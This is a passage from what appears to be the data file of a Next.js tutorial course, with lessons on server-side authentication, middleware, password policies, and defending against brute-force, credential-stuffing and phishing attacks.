            content: "No client-side API call is required. The form submits directly to the server."
          }
        ]
      },
      {
        heading: "Reading Authentication in Server Components",
        blocks: [
          {
            type: "paragraph",
            content: "Server Components can read cookies on the server before rendering."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "jsx",
            content: `import { cookies } from "next/headers";

export default async function Dashboard() {
  const cookieStore = await cookies();
  const session = cookieStore.get("session");

  if (!session) {
    return <h1>Please log in</h1>;
  }

  return <h1>Welcome!</h1>;
}`
          },
          {
            type: "paragraph",
            content: "Since this check happens on the server, unauthenticated users never receive protected HTML."
          }
        ]
      },
      {
        heading: "Authentication with Middleware",
        blocks: [
          {
            type: "paragraph",
            content: "Middleware runs before a request reaches a page."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "User Requests", "→",
              "/dashboard", "→",
              "Middleware", "→",
              "Session Exists?"
            ]
          },
          {
            type: "output",
            content: [
              "Yes → Continue",
              "No → Redirect Login"
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "typescript",
            content: `import { NextResponse } from "next/server";
import type { NextRequest } from "next/server";

export function middleware(request: NextRequest) {
  const session = request.cookies.get("session");

  if (!session) {
    return NextResponse.redirect(new URL("/login", request.url));
  }

  return NextResponse.next();
}

export const config = {
  matcher: ["/dashboard/:path*"],
};`
          },
          {
            type: "paragraph",
            content: "Middleware prevents unauthorized users from accessing protected routes."
          }
        ]
      },
      {
        heading: "Authentication in the Pages Router",
        blocks: [
          {
            type: "paragraph",
            content: "Before the App Router, authentication was commonly implemented using the Pages Router."
          },
          {
            type: "paragraph",
            content: "Typical structure:"
          },
          {
            type: "tree",
            content: `pages/
login.tsx
dashboard.tsx
api/
auth/
login.ts
logout.ts`
          },
          {
            type: "paragraph",
            content: "Authentication relied on API Routes and data-fetching functions such as getServerSideProps."
          }
        ]
      },
      {
        heading: "Pages Router Authentication Flow",
        blocks: [
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Login Form", "→",
              "POST /api/login", "→",
              "Database", "→",
              "Session Cookie", "→",
              "Browser", "→",
              "Dashboard"
            ]
          },
          {
            type: "paragraph",
            content: "Compared with the App Router, this approach usually requires separate API endpoints."
          }
        ]
      },
      {
        heading: "Protecting Pages with getServerSideProps",
        blocks: [
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "code",
            language: "javascript",
            content: `export async function getServerSideProps(context) {
  const session = context.req.cookies.session;

  if (!session) {
    return {
      redirect: {
        destination: "/login",
        permanent: false,
      },
    };
  }

  return {
    props: {},
  };
}`
          },
          {
            type: "paragraph",
            content: "The page is rendered only if the user is authenticated."
          }
        ]
      },
      {
        heading: "App Router vs Pages Router Authentication",
        blocks: [
          {
            type: "table",
            headers: [
              "Feature",
              "App Router",
              "Pages Router"
            ],
            rows: [
              [
                "Server Components",
                "✅",
                "❌"
              ],
              [
                "Server Actions",
                "✅",
                "❌"
              ],
              [
                "API Routes Required",
                "Optional",
                "Usually Yes"
              ],
              [
                "Route Handlers",
                "✅",
                "❌"
              ],
              [
                "Middleware",
                "✅",
                "✅"
              ],
              [
                "Streaming Support",
                "✅",
                "❌"
              ],
              [
                "Modern Recommendation",
                "✅",
                "Legacy"
              ]
            ]
          },
          {
            type: "paragraph",
            content: "For new Next.js applications, the App Router is the recommended choice."
          }
        ]
      },
      {
        heading: "Authentication Architecture",
        blocks: [
          {
            type: "paragraph",
            content: "A production-ready authentication system is more than just a login page. It consists of multiple layers working together."
          }
        ]
      },
      {
        heading: "High-Level Architecture",
        blocks: [
          {
            type: "code",
            language: "text",
            content: `                Browser
                    │
                    ▼
             Login Page / Forms
                    │
                    ▼
      Server Action / Route Handler
                    │
                    ▼
         Input Validation Layer
                    │
                    ▼
       Authentication Service
                    │
         ┌──────────┴──────────┐
         ▼                     ▼
 Database (Users)      Password Hasher
         │                     │
         └──────────┬──────────┘
                    ▼
        Session / JWT Generator
                    │
                    ▼
         Cookie / Token Storage
                    │
                    ▼
              Middleware
                    │
                    ▼
          Protected Resources`
          }
        ]
      },
      {
        heading: "Layer-by-Layer Responsibilities",
        blocks: [
          {
            type: "paragraph",
            content: "Presentation Layer"
          },
          {
            type: "paragraph",
            content: "Handles:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Login forms",
              "Registration forms",
              "Forgot password",
              "MFA screens"
            ]
          },
          {
            type: "paragraph",
            content: "Validation Layer"
          },
          {
            type: "paragraph",
            content: "Checks:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Required fields",
              "Email format",
              "Password strength",
              "Input sanitization"
            ]
          },
          {
            type: "paragraph",
            content: "Authentication Layer"
          },
          {
            type: "paragraph",
            content: "Responsible for:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "User lookup",
              "Password verification",
              "MFA verification",
              "Session creation"
            ]
          },
          {
            type: "paragraph",
            content: "Data Layer"
          },
          {
            type: "paragraph",
            content: "Stores:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "User records",
              "Password hashes",
              "Sessions",
              "Refresh tokens"
            ]
          },
          {
            type: "paragraph",
            content: "Protection Layer"
          },
          {
            type: "paragraph",
            content: "Controls access using:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Middleware",
              "Protected routes",
              "Authorization rules"
            ]
          }
        ]
      },
      {
        heading: "Authentication Request Lifecycle in Next.js",
        blocks: [
          {
            type: "flow",
            steps: [
              "Browser", "→",
              "Login Form", "→",
              "Server Action", "→",
              "Validate Input", "→",
              "Database", "→",
              "Verify Password", "→",
              "Generate Session", "→",
              "Set Cookie", "→",
              "Middleware", "→",
              "Dashboard", "→",
              "Subsequent Requests", "→",
              "Cookie Verification", "→",
              "Protected Content"
            ]
          },
          {
            type: "paragraph",
            content: "This lifecycle repeats for every protected request, ensuring continuous authentication."
          }
        ]
      },
      {
        heading: "Authentication Code Examples",
        blocks: [
          {
            type: "paragraph",
            content: "Login Form (Server Action)"
          },
          {
            type: "code",
            language: "jsx",
            content: `<form action={login}>
  <input
    name="email"
    type="email"
  />

  <input
    name="password"
    type="password"
  />

  <button>Login</button>
</form>`
          },
          {
            type: "paragraph",
            content: "Reading Cookies"
          },
          {
            type: "code",
            language: "javascript",
            content: `import { cookies } from "next/headers";

export async function getSession() {
  const cookieStore = await cookies();
  return cookieStore.get("session");
}`
          },
          {
            type: "paragraph",
            content: "Redirecting Unauthenticated Users"
          },
          {
            type: "code",
            language: "javascript",
            content: `import { redirect } from "next/navigation";

export default async function Dashboard() {
  const session = await getSession();

  if (!session) {
    redirect("/login");
  }

  return <h1>Dashboard</h1>;
}`
          },
          {
            type: "paragraph",
            content: "Logging Out"
          },
          {
            type: "code",
            language: "javascript",
            content: `"use server";

import { cookies } from "next/headers";
import { redirect } from "next/navigation";

export async function logout() {
  const cookieStore = await cookies();

  cookieStore.delete("session");

  redirect("/login");
}`
          }
        ]
      },
      {
        heading: "Real-World Authentication Architecture",
        blocks: [
          {
            type: "paragraph",
            content: "Consider an e-commerce application."
          },
          {
            type: "flow",
            steps: [
              "Customer", "→",
              "Login", "→",
              "Database", "→",
              "Session Cookie", "→",
              "Browse Products", "→",
              "Add to Cart", "→",
              "Checkout", "→",
              "Payment", "→",
              "Orders"
            ]
          },
          {
            type: "paragraph",
            content: "The same authenticated session is reused throughout the shopping experience."
          },
          {
            type: "paragraph",
            content: "Now consider an enterprise dashboard."
          },
          {
            type: "flow",
            steps: [
              "Employee", "→",
              "Login", "→",
              "MFA", "→",
              "Session", "→",
              "Middleware", "→",
              "Admin Dashboard", "→",
              "Reports", "→",
              "Analytics", "→",
              "Logout"
            ]
          },
          {
            type: "paragraph",
            content: "Every page verifies authentication before returning sensitive data."
          }
        ]
      },
      {
        heading: "Advantages of Authentication",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication provides numerous benefits beyond simply allowing users to log in."
          },
          {
            type: "paragraph",
            content: "Security"
          },
          {
            type: "paragraph",
            content: "Only verified users can access protected resources."
          },
          {
            type: "paragraph",
            content: "Personalization"
          },
          {
            type: "paragraph",
            content: "Applications can display user-specific data such as profiles, settings, and dashboards."
          },
          {
            type: "paragraph",
            content: "Data Privacy"
          },
          {
            type: "paragraph",
            content: "Sensitive information is hidden from unauthorized users."
          },
          {
            type: "paragraph",
            content: "Access Control"
          },
          {
            type: "paragraph",
            content: "Authentication forms the foundation for authorization and role-based access control (RBAC)."
          },
          {
            type: "paragraph",
            content: "Auditing"
          },
          {
            type: "paragraph",
            content: "Applications can track who performed actions and when."
          },
          {
            type: "paragraph",
            content: "Compliance"
          },
          {
            type: "paragraph",
            content: "Many industries require authenticated access to meet regulatory standards."
          }
        ]
      },
      {
        heading: "Limitations of Authentication",
        blocks: [
          {
            type: "paragraph",
            content: "Authentication also introduces complexity."
          },
          {
            type: "paragraph",
            content: "Additional Development"
          },
          {
            type: "paragraph",
            content: "Building secure authentication requires careful design and testing."
          },
          {
            type: "paragraph",
            content: "Security Risks"
          },
          {
            type: "paragraph",
            content: "Poor implementations can lead to:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Session hijacking",
              "Token theft",
              "Brute-force attacks",
              "Credential stuffing"
            ]
          },
          {
            type: "paragraph",
            content: "User Friction"
          },
          {
            type: "paragraph",
            content: "Long or complex login processes may discourage users."
          },
          {
            type: "paragraph",
            content: "Maintenance"
          },
          {
            type: "paragraph",
            content: "Password resets, MFA, session management, and account recovery all require ongoing support."
          },
          {
            type: "paragraph",
            content: "Infrastructure"
          },
          {
            type: "paragraph",
            content: "Authentication systems often need secure databases, HTTPS, monitoring, and logging."
          }
        ]
      },
      {
        heading: "When Authentication Is Needed",
        blocks: [
          {
            type: "paragraph",
            content: "Not every application requires authentication. The need depends on whether the application stores or exposes user-specific or sensitive data."
          },
          {
            type: "paragraph",
            content: "Authentication is recommended for:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "User dashboards",
              "Banking applications",
              "E-commerce accounts",
              "Learning platforms with personalized progress",
              "Healthcare systems",
              "Enterprise portals",
              "Social media applications",
              "SaaS products",
              "Content management systems (CMS)",
              "Administrative dashboards",
              "File storage and collaboration platforms"
            ]
          },
          {
            type: "paragraph",
            content: "Authentication is often unnecessary for:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Marketing websites",
              "Documentation sites",
              "Public blogs",
              "Landing pages",
              "Static portfolios",
              "Public knowledge bases"
            ]
          },
          {
            type: "paragraph",
            content: "However, even public applications may require authentication for features like comments, purchases, or user preferences."
          }
        ]
      },
      {
        heading: "Best Practices for Authentication in Next.js",
        blocks: [
          {
            type: "list",
            style: "unordered",
            items: [
              "Prefer the App Router for new projects.",
              "Use Server Actions or Route Handlers for authentication logic.",
              "Store sessions in secure, HttpOnly cookies.",
              "Always serve authentication over HTTPS.",
              "Hash passwords with Argon2id or bcrypt.",
              "Validate input on the server, even if client-side validation exists.",
              "Protect sensitive routes using Middleware or server-side checks.",
              "Keep authentication logic separate from UI components.",
              "Log authentication events without exposing secrets."
            ]
          },
          {
            type: "divider",
          }
        ]
      },
      
      {
        heading: "Authentication in Next.js",
        blocks: [
          {
            type: "paragraph",
            content: "In the previous lesson, you learned how authentication works internally and how users are verified. However, simply implementing a login system is not enough. Modern applications face millions of authentication attacks every day. According to security reports, stolen credentials, weak passwords, phishing attacks, and automated bots are among the most common causes of account compromise."
          },
          {
            type: "paragraph",
            content: "In this lesson, we'll learn how to design secure authentication systems by understanding password policies, brute-force attacks, credential stuffing, phishing awareness, and the best practices that every production application should follow."
          }
        ]
      },
      {
        heading: "Password Policies",
        blocks: [
          {
            type: "paragraph",
            content: "What is a Password Policy?"
          },
          {
            type: "paragraph",
            content: "A password policy is a collection of rules that determines how users create, manage, and update their passwords."
          },
          {
            type: "paragraph",
            content: "Its primary objectives are:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Increase password strength",
              "Reduce the likelihood of password guessing",
              "Prevent credential reuse",
              "Improve overall account security",
              "Balance security with user convenience"
            ]
          },
          {
            type: "paragraph",
            content: "Think of a password policy as the \"security gatekeeper\" that ensures every password meets a minimum level of protection before it is accepted."
          }
        ]
      },
      {
        heading: "Why Password Policies Exist",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine a website that accepts any password."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "output",
            content: [
              "123456",
              "password",
              "admin",
              "abcd",
              "111111",
              "qwerty"
            ]
          },
          {
            type: "paragraph",
            content: "These passwords can often be guessed within seconds by automated tools."
          },
          {
            type: "paragraph",
            content: "A good password policy prevents users from choosing such weak passwords."
          }
        ]
      },
      {
        heading: "The Evolution of Password Policies",
        blocks: [
          {
            type: "paragraph",
            content: "Older systems enforced extremely strict password rules."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Minimum 12 characters",
              "One uppercase",
              "One lowercase",
              "One number",
              "One symbol",
              "Change every 30 days",
              "Cannot reuse previous 10 passwords"
            ]
          },
          {
            type: "paragraph",
            content: "Although secure in theory, these rules often caused users to:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Write passwords on sticky notes",
              "Save passwords in plain text files",
              "Use predictable variations like:"
            ]
          },
          {
            type: "output",
            content: [
              "Password1!",
              "Password2!",
              "Password3!"
            ]
          },
          {
            type: "paragraph",
            content: "Modern security recommendations (such as those from NIST) emphasize long, unique passwords or passphrases over arbitrary complexity requirements."
          }
        ]
      },
      {
        heading: "Characteristics of a Strong Password",
        blocks: [
          {
            type: "paragraph",
            content: "A strong password should have several key properties."
          },
          {
            type: "paragraph",
            content: "1. Length"
          },
          {
            type: "paragraph",
            content: "Length is one of the biggest contributors to password strength."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "apple"
            ]
          },
          {
            type: "paragraph",
            content: "Very weak."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "CorrectHorseBatteryStaple"
            ]
          },
          {
            type: "paragraph",
            content: "Extremely strong because of its length and randomness."
          },
          {
            type: "paragraph",
            content: "Modern recommendations often suggest 12–16+ characters as a practical minimum, with longer passphrases offering even greater resistance to brute-force attacks."
          }
        ]
      },
      {
        heading: "2. Uniqueness",
        blocks: [
          {
            type: "paragraph",
            content: "Every website should have its own password."
          },
          {
            type: "paragraph",
            content: "Never use:"
          },
          {
            type: "flow",
            steps: [
              "Same password", "→",
              "Email", "→",
              "Bank", "→",
              "Shopping", "→",
              "Social Media"
            ]
          },
          {
            type: "paragraph",
            content: "If one site is compromised, attackers can try the same password elsewhere."
          }
        ]
      },
      {
        heading: "3. Randomness",
        blocks: [
          {
            type: "paragraph",
            content: "Avoid predictable information."
          },
          {
            type: "paragraph",
            content: "Bad:"
          },
          {
            type: "output",
            content: [
              "Faiz2004"
            ]
          },
          {
            type: "paragraph",
            content: "Good:"
          },
          {
            type: "output",
            content: [
              "T7!mQx#8Lp2@zN4"
            ]
          },
          {
            type: "paragraph",
            content: "Even better (easier to remember and strong):"
          },
          {
            type: "output",
            content: [
              "purple-train-ocean-lantern"
            ]
          }
        ]
      },
      {
        heading: "4. Unpredictability",
        blocks: [
          {
            type: "paragraph",
            content: "Avoid using:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Name",
              "Birthday",
              "Phone number",
              "Pet names",
              "School names",
              "Favorite sports teams"
            ]
          },
          {
            type: "paragraph",
            content: "Attackers often gather such information from social media."
          }
        ]
      },
      {
        heading: "Password Complexity",
        blocks: [
          {
            type: "paragraph",
            content: "A secure password may include a combination of:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Uppercase letters",
              "Lowercase letters",
              "Numbers",
              "Special symbols",
              "Long passphrases"
            ]
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "Q7@CloudMountain!River92"
            ]
          },
          {
            type: "paragraph",
            content: "However, complexity alone does not guarantee security. A short complex password can still be weaker than a long passphrase."
          }
        ]
      },
      {
        heading: "Password Strength Comparison",
        blocks: [
          {
            type: "table",
            headers: [
              "Password",
              "Strength",
              "Why"
            ],
            rows: [
              [
                "123456",
                "Very Weak",
                "Common password"
              ],
              [
                "password",
                "Very Weak",
                "Dictionary word"
              ],
              [
                "Hello123",
                "Weak",
                "Predictable pattern"
              ],
              [
                "MyDog2025",
                "Moderate",
                "Personal information"
              ],
              [
                "PurpleRiverCloud!78",
                "Strong",
                "Long and varied"
              ],
              [
                "battery-horse-window-galaxy",
                "Very Strong",
                "Long passphrase"
              ]
            ]
          }
        ]
      },
      {
        heading: "Password Validation in Next.js",
        blocks: [
          {
            type: "paragraph",
            content: "Client-side validation provides immediate feedback, but server-side validation is essential because client-side checks can be bypassed."
          },
          {
            type: "paragraph",
            content: "Example (client-side):"
          },
          {
            type: "code",
            language: "javascript",
            content: `if (password.length < 12) {
  setError("Password must be at least 12 characters.");
}`
          },
          {
            type: "paragraph",
            content: "Example (server-side):"
          },
          {
            type: "code",
            language: "javascript",
            content: `if (password.length < 12) {
  throw new Error("Weak password");
}`
          },
          {
            type: "paragraph",
            content: "Always validate passwords again on the server."
          }
        ]
      },
      {
        heading: "Password Managers",
        blocks: [
          {
            type: "paragraph",
            content: "Users should not be expected to memorize dozens of unique passwords."
          },
          {
            type: "paragraph",
            content: "Password managers:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Generate strong passwords",
              "Store encrypted credentials",
              "Auto-fill login forms",
              "Reduce password reuse"
            ]
          },
          {
            type: "paragraph",
            content: "Examples include 1Password, Bitwarden, Dashlane, and built-in browser password managers."
          }
        ]
      },
      {
        heading: "Password Rotation",
        blocks: [
          {
            type: "paragraph",
            content: "Many organizations once required users to change passwords every 30–90 days."
          },
          {
            type: "paragraph",
            content: "Today, forced rotation is generally recommended only when:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "A password is suspected to be compromised.",
              "A data breach occurs.",
              "An administrator resets credentials.",
              "High-security compliance requires periodic changes."
            ]
          },
          {
            type: "paragraph",
            content: "Unnecessary rotation often leads to weaker, predictable passwords."
          }
        ]
      },
      {
        heading: "Password Reset Flow",
        blocks: [
          {
            type: "paragraph",
            content: "A secure password reset process looks like this:"
          },
          {
            type: "flow",
            steps: [
              "Forgot Password", "→",
              "Enter Email", "→",
              "Server Generates Reset Token", "→",
              "Email Sent", "→",
              "User Clicks Link", "→",
              "Verify Token", "→",
              "Create New Password", "→",
              "Delete Token", "→",
              "Login Again"
            ]
          },
          {
            type: "paragraph",
            content: "Key principles:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Use one-time, short-lived reset tokens.",
              "Expire tokens after a limited time.",
              "Never reveal whether an email address exists.",
              "Invalidate old sessions after a password change when appropriate."
            ]
          }
        ]
      },
      {
        heading: "Common Password Policy Mistakes",
        blocks: [
          {
            type: "paragraph",
            content: "Avoid these practices:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Maximum password length of only 8 characters.",
              "Storing passwords in plain text.",
              "Allowing common passwords like password123.",
              "Rejecting password managers.",
              "Limiting special characters without reason.",
              "Exposing password rules only after form submission."
            ]
          }
        ]
      },
      {
        heading: "Real-World Example",
        blocks: [
          {
            type: "paragraph",
            content: "GitHub allows long passwords and encourages MFA rather than requiring users to change passwords every month. This approach improves both security and usability."
          }
        ]
      },
      {
        heading: "Brute-Force Attacks",
        blocks: [
          {
            type: "paragraph",
            content: "What is a Brute-Force Attack?"
          },
          {
            type: "paragraph",
            content: "A brute-force attack is a method where an attacker repeatedly tries different password combinations until the correct one is found."
          },
          {
            type: "paragraph",
            content: "Instead of exploiting software bugs, the attacker exploits weak or guessable passwords."
          }
        ]
      },
      {
        heading: "How a Brute-Force Attack Works",
        blocks: [
          {
            type: "flow",
            steps: [
              "Attacker", "→",
              "Login Page", "→",
              "Try Password #1", "→",
              "Incorrect", "→",
              "Try Password #2", "→",
              "Incorrect", "→",
              "Try Password #3", "→",
              "Incorrect", "→",
              "Thousands or Millions More Attempts", "→",
              "Eventually Password Found"
            ]
          },
          {
            type: "paragraph",
            content: "Modern attackers automate this process using bots."
          }
        ]
      },
      {
        heading: "Types of Brute-Force Attacks",
        blocks: [
          {
            type: "paragraph",
            content: "Simple Brute Force"
          },
          {
            type: "paragraph",
            content: "Every possible password combination is attempted."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "aaaa",
              "aaab",
              "aaac",
              "..."
            ]
          },
          {
            type: "paragraph",
            content: "Dictionary Attack"
          },
          {
            type: "paragraph",
            content: "Instead of trying every combination, attackers use lists of common passwords."
          },
          {
            type: "paragraph",
            content: "Examples:"
          },
          {
            type: "output",
            content: [
              "password",
              "123456",
              "football",
              "welcome",
              "admin123"
            ]
          },
          {
            type: "paragraph",
            content: "Because many users choose predictable passwords, dictionary attacks are highly effective."
          },
          {
            type: "paragraph",
            content: "Hybrid Attack"
          },
          {
            type: "paragraph",
            content: "Combines dictionary words with common variations."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "password123",
              "Password123!",
              "Welcome2025"
            ]
          },
          {
            type: "paragraph",
            content: "Reverse Brute Force"
          },
          {
            type: "paragraph",
            content: "Instead of attacking one account with many passwords, attackers try one common password against many accounts."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "Password123", "→",
              "100,000 users"
            ]
          }
        ]
      },
      {
        heading: "Why Brute-Force Attacks Are Dangerous",
        blocks: [
          {
            type: "paragraph",
            content: "Weak passwords can often be guessed in seconds."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "admin123"
            ]
          },
          {
            type: "paragraph",
            content: "versus"
          },
          {
            type: "output",
            content: [
              "Purple-Rocket-Coffee-Mountain-72"
            ]
          },
          {
            type: "paragraph",
            content: "The second password is exponentially harder to crack."
          }
        ]
      },
      {
        heading: "Protecting Against Brute-Force Attacks",
        blocks: [
          {
            type: "paragraph",
            content: "Account Lockout"
          },
          {
            type: "paragraph",
            content: "Temporarily lock accounts after multiple failed attempts."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "5 failed attempts", "→",
              "Account locked for 15 minutes"
            ]
          },
          {
            type: "paragraph",
            content: "Avoid permanent lockouts that attackers could abuse to deny service to legitimate users."
          },
          {
            type: "paragraph",
            content: "Rate Limiting"
          },
          {
            type: "paragraph",
            content: "Limit how many login attempts are allowed within a time window."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "10 attempts", "→",
              "1 minute", "→",
              "Further requests blocked"
            ]
          },
          {
            type: "paragraph",
            content: "CAPTCHA"
          },
          {
            type: "paragraph",
            content: "Require users to complete a CAPTCHA after repeated failed logins."
          },
          {
            type: "paragraph",
            content: "This helps distinguish humans from automated bots."
          },
          {
            type: "paragraph",
            content: "Multi-Factor Authentication (MFA)"
          },
          {
            type: "paragraph",
            content: "Even if an attacker guesses the password, they still need a second factor (such as a one-time code or security key)."
          },
          {
            type: "paragraph",
            content: "Strong Passwords"
          },
          {
            type: "paragraph",
            content: "Long, unique passwords significantly increase the time required for brute-force attacks."
          }
        ]
      },
      {
        heading: "Brute-Force Attack Lifecycle",
        blocks: [
          {
            type: "flow",
            steps: [
              "Bot Starts", "→",
              "Target Login Page", "→",
              "Attempt Password", "→",
              "Success?", "→",
              "Yes → Account Compromised", "→",
              "No → Retry", "→",
              "Rate Limiter?", "→",
              "Blocked"
            ]
          }
        ]
      },
      {
        heading: "Credential Stuffing",
        blocks: [
          {
            type: "paragraph",
            content: "What is Credential Stuffing?"
          },
          {
            type: "paragraph",
            content: "Credential stuffing is an attack where stolen username/password combinations from one data breach are automatically tried on other websites."
          },
          {
            type: "paragraph",
            content: "Unlike brute-force attacks, the attacker already has valid credentials—they're just testing whether users reused them elsewhere."
          }
        ]
      },
      {
        heading: "Why Credential Stuffing Works",
        blocks: [
          {
            type: "paragraph",
            content: "Many users reuse the same password across multiple services."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "flow",
            steps: [
              "Netflix", "→",
              "Password Leak", "→",
              "Attacker Obtains Credentials", "→",
              "Tries Same Credentials On", "→",
              "Amazon", "→",
              "Bank", "→",
              "Email", "→",
              "Shopping Website"
            ]
          },
          {
            type: "paragraph",
            content: "If the user reused the password, multiple accounts may be compromised."
          }
        ]
      },
      {
        heading: "Credential Stuffing Workflow",
        blocks: [
          {
            type: "flow",
            steps: [
              "Data Breach", "→",
              "Millions of Credentials", "→",
              "Automation Bot", "→",
              "Website A", "→",
              "Website B", "→",
              "Website C", "→",
              "Successful Login"
            ]
          }
        ]
      },
      {
        heading: "Credential Stuffing vs Brute Force",
        blocks: [
          {
            type: "table",
            headers: [
              "Brute Force",
              "Credential Stuffing"
            ],
            rows: [
              [
                "Guesses passwords",
                "Uses stolen passwords"
              ],
              [
                "May take many attempts",
                "Uses valid credentials"
              ],
              [
                "Exploits weak passwords",
                "Exploits password reuse"
              ],
              [
                "Often noisy",
                "Can appear like normal logins"
              ]
            ]
          }
        ]
      },
      {
        heading: "How to Prevent Credential Stuffing",
        blocks: [
          {
            type: "paragraph",
            content: "Encourage Unique Passwords"
          },
          {
            type: "paragraph",
            content: "Every account should have a different password."
          },
          {
            type: "paragraph",
            content: "Use Password Managers"
          },
          {
            type: "paragraph",
            content: "They make unique passwords practical for users."
          },
          {
            type: "paragraph",
            content: "Enable MFA"
          },
          {
            type: "paragraph",
            content: "Even stolen passwords are insufficient without the second authentication factor."
          },
          {
            type: "paragraph",
            content: "Monitor Login Behavior"
          },
          {
            type: "paragraph",
            content: "Watch for:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Impossible travel",
              "Unusual devices",
              "Large numbers of login attempts",
              "Suspicious IP addresses"
            ]
          },
          {
            type: "paragraph",
            content: "Check Against Breached Passwords"
          },
          {
            type: "paragraph",
            content: "Many organizations compare new passwords against known breached password databases and reject compromised choices."
          }
        ]
      },
      {
        heading: "Phishing Awareness",
        blocks: [
          {
            type: "paragraph",
            content: "What is Phishing?"
          },
          {
            type: "paragraph",
            content: "Phishing is a social engineering attack where attackers trick users into revealing credentials or sensitive information."
          },
          {
            type: "paragraph",
            content: "Instead of breaking encryption, attackers manipulate people."
          },
          {
            type: "paragraph",
            content: "Example"
          },
          {
            type: "paragraph",
            content: "An attacker sends an email:"
          },
          {
            type: "output",
            content: [
              "Your account has been suspended.",
              "",
              "Click here immediately to verify.",
              "",
              "www.my-bank-security-login.com"
            ]
          },
          {
            type: "paragraph",
            content: "The link leads to a fake login page that steals credentials."
          }
        ]
      },
      {
        heading: "Phishing Workflow",
        blocks: [
          {
            type: "flow",
            steps: [
              "Attacker", "→",
              "Fake Email", "→",
              "Victim Clicks Link", "→",
              "Fake Website", "→",
              "Victim Logs In", "→",
              "Credentials Stolen", "→",
              "Real Account Compromised"
            ]
          }
        ]
      },
      {
        heading: "Types of Phishing",
        blocks: [
          {
            type: "paragraph",
            content: "Email Phishing"
          },
          {
            type: "paragraph",
            content: "The most common type, using fraudulent emails."
          },
          {
            type: "paragraph",
            content: "SMS Phishing (Smishing)"
          },
          {
            type: "paragraph",
            content: "Attackers send deceptive text messages."
          },
          {
            type: "paragraph",
            content: "Example:"
          },
          {
            type: "output",
            content: [
              "Your package is waiting.",
              "",
              "Click here."
            ]
          },
          {
            type: "paragraph",
            content: "Voice Phishing (Vishing)"
          },
          {
            type: "paragraph",
            content: "Attackers impersonate banks or support agents over the phone."
          },
          {
            type: "paragraph",
            content: "Spear Phishing"
          },
          {
            type: "paragraph",
            content: "Highly targeted attacks aimed at specific individuals or organizations, often using personalized information."
          }
        ]
      },
      {
        heading: "Warning Signs of Phishing",
        blocks: [
          {
            type: "paragraph",
            content: "Be cautious of:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Urgent or threatening language.",
              "Unexpected login requests.",
              "Misspelled domain names.",
              "Requests for passwords or OTPs.",
              "Poor grammar or unusual formatting.",
              "Attachments from unknown senders."
            ]
          }
        ]
      },
      {
        heading: "Protecting Users from Phishing",
        blocks: [
          {
            type: "paragraph",
            content: "Developers should:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Enforce HTTPS.",
              "Use secure cookies.",
              "Enable MFA.",
              "Implement email verification.",
              "Educate users about phishing.",
              "Display the correct domain prominently.",
              "Never ask users to send passwords via email or chat."
            ]
          },
          {
            type: "paragraph",
            content: "Users should:"
          },
          {
            type: "list",
            style: "unordered",
            items: [
              "Verify URLs before logging in.",
              "Avoid clicking suspicious links.",
              "Use password managers (which typically refuse to autofill on fake domains).",
              "Report suspicious emails."
            ]
          }
        ]
      },
      {
        heading: "Real-World Scenario",
        blocks: [
          {
            type: "paragraph",
            content: "Imagine an employee receives an email claiming to be from the IT department:"
          },
          {
            type: "output",
            content: [
              "Your password expires today.",
              "",
              "Click here to update it."
            ]
          },
          {
            type: "paragraph",
            content: "The link points to:"
          },
          {
            type: "output",
            content: [
              "https://company-security-login.example.com"
            ]
          },
          {
            type: "paragraph",
            content: "instead of the legitimate:"
          },
          {
            type: "output",
            content: [
              "https://company.com"
            ]
          },
          {
            type: "paragraph",
            content: "The page looks identical to the real login screen. If the employee enters their credentials, the attacker can immediately access the real account."
          },
          {
            type: "paragraph",
            content: "This demonstrates why technical safeguards (MFA, secure authentication flows) must be combined with user awareness."
          }
        ]
      },

      {
        heading: "Authentication in Next.js",
        blocks: [
          {
            type: "paragraph",
            content: "In the previous lesson, we explored password policies, brute-force attacks, credential stuffing, and phishing. However, even the strongest password becomes useless if the login form is insecure, the connection is unencrypted, or passwords are stored incorrectly."
          },
          {
            type: "paragraph",
